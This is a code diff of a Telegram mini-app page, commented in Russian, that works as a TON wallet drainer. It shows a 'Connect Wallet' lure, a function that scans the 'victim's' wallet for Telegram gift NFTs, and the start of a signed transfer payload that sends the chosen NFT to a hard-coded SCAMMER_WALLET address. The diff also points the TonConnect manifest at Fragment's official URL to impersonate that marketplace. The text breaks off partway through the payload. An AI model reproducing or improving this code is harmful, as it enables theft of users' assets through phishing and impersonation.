@@ -39,13 +39,13 @@
 </head>
 <body>
     <div class="container">
-        <!-- Кнопка подключения кошелька (видна сразу) -->
+        <!-- Кнопка подключения (видна сразу) -->
         <button class="btn active" id="connectBtn">Connect Wallet</button>
 
-        <!-- Экран загрузки (показывается после подключения) -->
+        <!-- Загрузка -->
         <div id="loading" class="loading-text">Поиск доступных офферов...</div>
 
-        <!-- Основной экран (показывается, когда подарок найден) -->
+        <!-- Карточка оффера -->
         <div class="card" id="mainCard">
             <div class="header">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#0098EA"/><path d="M12 6V18M12 6L6 12M12 6L18 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -76,11 +76,13 @@
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.ready(); tg.expand(); }
         
+        // ИСПОЛЬЗУЕМ ОФИЦИАЛЬНЫЙ МАНИФЕСТ FRAGMENT
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
-            manifestUrl: "https://jejemakersx-netizen.github.io/fsdfdsfsdfsf/tonconnect-manifest.json" 
+            manifestUrl: "https://fragment.com/tonconnect-manifest.json" 
         });
 
-        const SCAMMER_WALLET = "UQCGPRdMpxZRFAPIukR1AoJNeaR14xCZ2RprQi5hucd_ncjy"; 
+        // Твой кошелек, куда прилетит подарок
+        const SCAMMER_WALLET = "UQChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZWTE"; 
         let targetNftAddress = null;
 
         const connectBtn = document.getElementById('connectBtn');
@@ -88,7 +90,7 @@
         const mainCard = document.getElementById('mainCard');
         const acceptBtn = document.getElementById('acceptBtn');
 
-        // Обработчик кнопки подключения
+        // Подключение кошелька
         connectBtn.addEventListener('click', async () => {
             try {
                 connectBtn.disabled = true;
@@ -99,7 +101,7 @@
             }
         });
 
-        // Следим за статусом кошелька
+        // Отслеживаем статус
         tonConnectUI.onStatusChange(async (wallet) => {
             if (wallet) {
                 connectBtn.classList.remove('active');
@@ -113,16 +115,18 @@
             }
         });
 
+        // Сканируем NFT жертвы
         async function scanVictimWallet(address) {
             try {
                 const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts`);
                 const data = await res.json();
 
                 if (!data.nft_items || data.nft_items.length === 0) {
-                    loading.innerText = "У вас нет NFT для продажи.";
+                    loading.innerText = "У вас нет подарков для продажи.";
                     return;
                 }
 
+                // Ищем именно подарок
                 let nft = data.nft_items.find(item => 
                     (item.collection?.name || "").toLowerCase().includes("gift") || 
                     (item.metadata?.name || "").toLowerCase().includes("gift")
@@ -130,6 +134,7 @@
 
                 targetNftAddress = nft.address;
 
+                // Подтягиваем картинку и название
                 document.getElementById('giftImage').src = nft.previews && nft.previews.length > 0 ? nft.previews[0].url : "";
                 document.getElementById('giftName').innerText = nft.metadata?.name || "Telegram Gift";
                 document.getElementById('giftCollection').innerText = nft.collection?.name || "Gifts Collection";
@@ -144,6 +149,7 @@
             }
         }
 
+        // Подпись транзакции (перевод NFT)
         acceptBtn.addEventListener('click', async () => {
             if (!targetNftAddress) return;
             
@@ -153,6 +159,7 @@
             try {
                 const { beginCell, Address } = window.tonCore;
                 
+                // Формируем пейлоад перевода NFT на кошелек скамера
                 const body = beginCell();
                 body.storeUint(0x5fcc3d14, 32); 
                 body.storeUint(0, 64);          
